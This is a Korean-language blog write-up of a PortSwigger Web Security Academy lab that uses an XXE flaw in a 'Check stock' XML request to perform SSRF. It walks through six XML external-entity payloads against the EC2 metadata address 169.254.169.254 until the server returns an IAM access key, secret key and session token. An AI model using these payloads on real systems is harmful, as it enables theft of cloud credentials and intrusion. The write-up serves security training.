---
layout: post
title: "Burp Academy 문제풀이 - Exploiting XXE to perform SSRF attacks"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, XXE]
toc: true
---

# 개요
- XXE를 응용해서 SSRF 공격을 하는 예제이다. 
- 문제 주소: https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf
- XXE 설명 주소: https://portswigger.net/web-security/xxe
- 난이도: APPRENTICE (쉬움)

# 문제분석
- 이 랩에는 XML 인풋을 파싱해서 에러를 포함한 결과를 리턴해주는 "Check stack" 기능이 있다. 
- 문제 서버는 EC2 메타데이터 엔드포인트를 디폴트 URL (http://169.254.169.254/) 로 돌리고 있다. 
- 이 엔드포인트를 통해서 인스턴스에 대한 정보를 얻을 수 있다. 여기에는 민감한 정보가 포함되어 있을 수 있다. 
- 문제를 풀려면 서버의 IAM 시크릿 억세스키 를 얻어내면 된다. 

```
This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.

To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint.
```

# XXE 를 사용해서 SSRF 하는 패턴
다음과 같은 설명이 되어 있다. 만약 XXE 취약점이 있는 서버에서만 접근가능한 서버가 있다면,  그 서버의 정보를 XXE 취약점 있는 서버를 통해서 얻어낼 수 있다. (SSRF)

```
Aside from retrieval of sensitive data, the other main impact of XXE attacks is that they can be used to perform server-side request forgery (SSRF). This is a potentially serious vulnerability in which the server-side application can be induced to make HTTP requests to any URL that the server can access.

To exploit an XXE vulnerability to perform an SSRF attack, you need to define an external XML entity using the URL that you want to target, and use the defined entity within a data value. If you can use the defined entity within a data value that is returned in the application's response, then you will be able to view the response from the URL within the application's response, and so gain two-way interaction with the back-end system. If not, then you will only be able to perform blind SSRF attacks (which can still have critical consequences).

In the following XXE example, the external entity will cause the server to make a back-end HTTP request to an internal system within the organization's infrastructure:
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

# 풀이
## XXE 취약점이 있는 곳 찾기 
[이전 문제]({% post_url 2023-01-13-burp-academy-xxe-1 %})와 마찬가지로 상품의 상세 페이지에서 "Check stock" 버튼을 누르면 POST 바디에 XML이 있는 것을 확인할 수 있다. 

![XXE 취약점 있는 곳](/images/burp-academy-xxe-2-2.png)

버튼 클릭시의 요청을 캡쳐해보면 다음과 같다. POST 바디의 XML을 변조하면 될 것 같다. 

```
POST /product/stock HTTP/1.1
Host: 0a7000f20367b31bc022226200f50064.web-security-academy.net
Cookie: session=U5aVcT9Ue58F2we2KJukwvF8eZeK6zk1
Content-Length: 107
Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Content-Type: application/xml
Accept: */*
Origin: https://0a7000f20367b31bc022226200f50064.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a7000f20367b31bc022226200f50064.web-security-academy.net/product?productId=9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ko;q=0.8
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>9</productId>
    <storeId>1</storeId>
</stockCheck>

```

## 1차 시도 
다음 XXE 페이로드를 지정한다. 
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

결과 응답은 다음과 같다. latest 가 잘못된 product ID라고 한다. 
어쨌든 XXE는 가능했고, `http://169.254.169.254/` 에 접근한 결과가 latest 였다고 추측할 수 있다. 

```
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 28

"Invalid product ID: latest"
```

## 2차 시도 
AWS 의 크레덴셜은 `~/.aws/credentials` 에 저장된다. `.aws/credentials` 를 붙여서 전송해봤다. 
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/.aws/credentials"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

File 이 없다고 한다. 다른 방법을 생각해보자. 
```
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 102

"XML parser exited with error: java.io.FileNotFoundException: http://169.254.169.254/.aws/credentials"
```

## 3차 시도 
- 문제를 다시 한번 읽어봤다. 
- 서버는 EC2의 메타데이터 엔드포인트가 돌아가고 있다고 한다. 
- 구글검색을 해보니 [다음 페이지](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html){:target="_blank"} 에서 메타데이터용 URL패스가 있는 것을 알았다. `/latest/meta-data/` 가 메타데이터용 디폴트 URL패스라고 한다. 이 것을 붙여서 시도해보자. 

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

메세지가 바꼈다. `iam` 이라는 프로덕트 ID를 찾을 수 없다고 한다. 
```
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 25

"Invalid product ID: iam"
```

## 4차시도 
이번에는 뒤에 추가로 iam 을 붙여봤다. 

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

그러자 또 응답이 바꼈다. `security-credentials` 라는 프로덕트 ID를 찾을 수 없다고 한다. 아하, 알겠다. 패스(경로)가 맞으면 그 다음패스를 알려주는 것 같다. (그래서 처음 시도에서 `lastest` 가 노출되었던 것 같다. )
```
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 42

"Invalid product ID: security-credentials"
```

## 5차 시도 
그러면 `security-credentials` 까지 붙여서 시도해본다. 

```xml 
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

`admin` 이라는 프로적트 ID가 없다고 한다. OK, 그러면 admin까지 붙여보자. 

```
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 27

"Invalid product ID: admin"
```

## 6차 시도 

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

SSRF로 억세스키 정보를 얻어내는데 성공했다!
```
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 552

"Invalid product ID: {
  "Code" : "Success",
  "LastUpdated" : "2023-01-14T23:56:27.356844044Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "2mR1bY0TY5xzfuZ7Y5NY",
  "SecretAccessKey" : "OBQgv7208RWjcGbJxcMybYKNcH5LQIJzArFUV8NW",
  "Token" : "UboJAgGmpFtNAqNESOyr7243VgJbZQ2mRQtszm0joT2EGz4SWN3Hy1OBDkclMyvPzbfgC6Qvj2ylU9WYTI8PwG0SYbL72g4u66fShsWRbn58uK2KMgrbVTZc58YmOfUKIjPGTUYyt5xBSB7Vuk1Sz5x2vzPBF2jXwb4ndAEatKNxXZ7zmVVcmLVTZACtvvJetrJ8bcPPAIG36hmder98uLwGt5cymEzdDfwmcpUaFl4PEuKkaq0zevlQrj3TbX7S",
  "Expiration" : "2029-01-12T23:56:27.356844044Z"
}"
```
![SSRF XXE Repater](/images/burp-academy-xxe-2-1.png)

![SSRF XXE 성공](/images/burp-academy-xxe-2-success.png)
